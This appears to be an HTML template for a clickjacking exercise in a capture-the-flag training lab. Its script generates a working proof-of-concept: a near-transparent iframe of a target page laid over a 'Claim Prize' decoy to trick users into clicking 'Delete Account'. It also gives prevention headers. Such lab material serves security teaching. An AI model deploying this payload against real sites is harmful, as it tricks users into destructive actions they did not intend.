<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><%= title %> - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
<body>
  <div class="matrix-bg"></div>
  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a></div></nav>
  <div class="lab-container">
    <div class="lab-header"><h1><i class="fas fa-mouse-pointer"></i> Clickjacking</h1><div class="lab-info"><span class="lab-tag difficulty-easy">Easy</span></div></div>
    <div class="lab-section"><h2><i class="fas fa-crosshairs"></i> Objective</h2><p>The target page lacks X-Frame-Options and CSP frame-ancestors headers. Create a clickjacking attack that tricks a user into clicking the "Delete Account" button.</p></div>
    <div class="lab-section"><h2><i class="fas fa-terminal"></i> Clickjacking PoC Builder</h2>
      <div class="vulnerable-form">
        <div style="margin-bottom:1rem;">
          <label for="targetUrl">Target URL to Frame:</label>
          <input type="text" id="targetUrl" value="/labs/advanced/clickjacking/target">
        </div>
        <div style="margin-bottom:1rem;">
          <label for="opacity">Iframe Opacity:</label>
          <input type="range" id="opacity" min="0" max="100" value="30" oninput="updatePreview()">
          <span id="opacityVal">0.3</span>
        </div>
        <button class="btn" onclick="generatePoc()"><i class="fas fa-code"></i> Generate PoC</button>
        <button class="btn" onclick="testClickjack()" style="margin-left:0.5rem;"><i class="fas fa-play"></i> Test Attack</button>
      </div>
      <div id="clickjackPreview" style="position:relative;height:300px;margin-top:1rem;border:1px solid var(--primary-dim);overflow:hidden;"></div>
      <div id="clickjackResults" class="result-box" style="margin-top:1rem;"></div>
      <div class="code-block">
        <h4><i class="fas fa-lightbulb"></i> Hints</h4>
        <pre>
# Clickjacking requires:
# 1. Target page can be framed (no X-Frame-Options/CSP)
# 2. Transparent iframe positioned over decoy content
# 3. User clicks what they think is safe → actually clicks target

# Prevention: X-Frame-Options: DENY
# or Content-Security-Policy: frame-ancestors 'none'
        </pre>
      </div>
    </div>
    <div class="flag-submit"><h3><i class="fas fa-flag"></i> Capture The Flag</h3>
      <form onsubmit="submitFlagInline('advanced-clickjacking','flagInput_click','flagResult_click'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_click" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
      <div id="flagResult_click" style="display:none; margin-top:1rem;"></div>
    </div>
  </div>
  <script src="/js/main.js"></script>
  <script>
    function updatePreview() {
      var val = document.getElementById('opacity').value / 100;
      document.getElementById('opacityVal').textContent = val.toFixed(2);
    }
    function generatePoc() {
      var url = document.getElementById('targetUrl').value;
      var opacity = document.getElementById('opacity').value / 100;
      var resultsDiv = document.getElementById('clickjackResults');
      var html = '&lt;style&gt;\niframe { position:absolute; top:0; left:0; width:100%; height:100%; opacity:' + opacity + '; z-index:2; }\n.decoy { position:relative; z-index:1; }\n&lt;/style&gt;\n&lt;div class="decoy"&gt;\n  &lt;h1&gt;Click here to win!&lt;/h1&gt;\n  &lt;button&gt;Claim Prize&lt;/button&gt;\n&lt;/div&gt;\n&lt;iframe src="' + url + '"&gt;&lt;/iframe&gt;';
      resultsDiv.innerHTML = '<h4 style="color:var(--primary)">Generated PoC HTML:</h4><pre style="color:var(--text);white-space:pre-wrap;">' + html + '</pre>';
    }
    async function testClickjack() {
      const url = document.getElementById('targetUrl').value;
      const resultsDiv = document.getElementById('clickjackResults');
      try {
        const res = await fetch('/api/labs/advanced/clickjacking', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ url }) });
        const data = await res.json();
        resultsDiv.innerHTML = '<p style="color:' + (data.vulnerable ? '#00ff00' : '#ff4444') + '"><i class="fas fa-' + (data.vulnerable ? 'check' : 'times') + '-circle"></i> ' + data.message + '</p>';
      } catch(e) { resultsDiv.innerHTML = '<p style="color:#ff4444">Error: ' + e.message + '</p>'; }
    }
  </script>
</body>
</html>
